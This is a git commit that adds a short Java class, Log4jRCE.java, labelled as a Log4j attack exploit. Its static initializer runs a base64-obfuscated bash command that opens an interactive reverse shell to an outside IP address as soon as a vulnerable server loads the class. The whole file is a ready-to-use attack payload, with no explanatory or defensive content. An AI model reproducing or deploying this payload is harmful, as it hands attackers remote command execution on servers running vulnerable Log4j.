4b283b76f5b8071105378847c0df4fc733150abc
lfz <75104414+lfz97@users.noreply.github.com>
2021-12-21 17:26:47 +0800

    Create Log4jRCE.java

---
+++ src/main/exp/Log4jRCE.java
@@ -0,0 +1,12 @@
+//log4j 攻击EXP
+import java.io.IOException;
+
+public class Log4jRCE {
+    static {
+        try {
+            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDIuMTg3LjMxLzM4MzggMD4mMQ==}|{base64,-d}|{bash,-i}");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
